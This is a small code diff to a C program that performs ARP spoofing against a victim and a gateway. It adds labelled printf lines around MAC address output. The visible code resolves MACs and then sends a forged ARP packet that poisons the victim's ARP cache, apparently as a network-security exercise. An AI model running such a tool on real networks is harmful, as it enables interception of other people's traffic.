@@ -29,6 +29,7 @@ int main(int argc, char *argv[])
 	argv_ip(argv[2], victim_ip);
 	argv_ip(argv[3], gate_ip);
 	my_mac(dev, attacker_mac);
+	printf("attacker mac addr : ");
 	print_mac(attacker_mac);
 	s_getIpAddress(dev, attacker_ip);
 	print_ip(attacker_ip);
@@ -41,9 +42,11 @@ int main(int argc, char *argv[])
 	}
 	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, gate_ip, 0);
 	reply(dev, pcap, gate_mac);
+	printf("target mac addr : ");
 	print_mac(gate_mac);
 	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, victim_ip, 0);
 	reply(dev, pcap, victim_mac);
+	printf("sender mac addr : ");
 	print_mac(victim_mac);
 	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
 	return 0;
